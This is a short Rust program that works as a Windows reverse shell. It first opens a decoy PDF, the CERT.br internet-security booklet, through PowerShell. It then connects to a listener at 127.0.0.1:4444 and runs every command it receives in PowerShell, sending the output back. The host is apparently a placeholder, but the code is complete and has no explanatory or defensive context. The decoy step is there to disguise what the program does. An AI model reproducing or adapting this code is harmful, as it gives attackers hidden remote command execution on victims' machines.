use std::net::{TcpStream};
use std::io::{Read, Write};
use std::process;
use powershell_script;
use std::str::from_utf8;



fn main(){
    let ip: &str = "127.0.0.1";
    let port: i32 = 4444;
    
    let mut buff = [0; 1024];

    let output: bool = powershell_script::run("explorer https://cartilha.cert.br/livro/cartilha-seguranca-internet.pdf").unwrap().success();

    if output == true {
        match TcpStream::connect(&format!("{}:{}", ip, port)) {
            Ok(mut stream) => {
                loop {
                    let size = stream.read(&mut buff).unwrap();
                    
                    match powershell_script::run(from_utf8(&mut buff[0..size]).unwrap()) {
                        Ok(shell) => {                                    
                            if &shell.stdout().is_none() == &true {
                                continue;

                            }else {
                                stream.write(&shell.stdout().unwrap().as_bytes());

                            }

                        }, 
                        Err(err) => {
                            continue;

                        },
                    }
                }
            },
    
            Err(_) => {
                process::exit(0);
    
            },
        }

    }else {
        process::exit(0);

    } 
}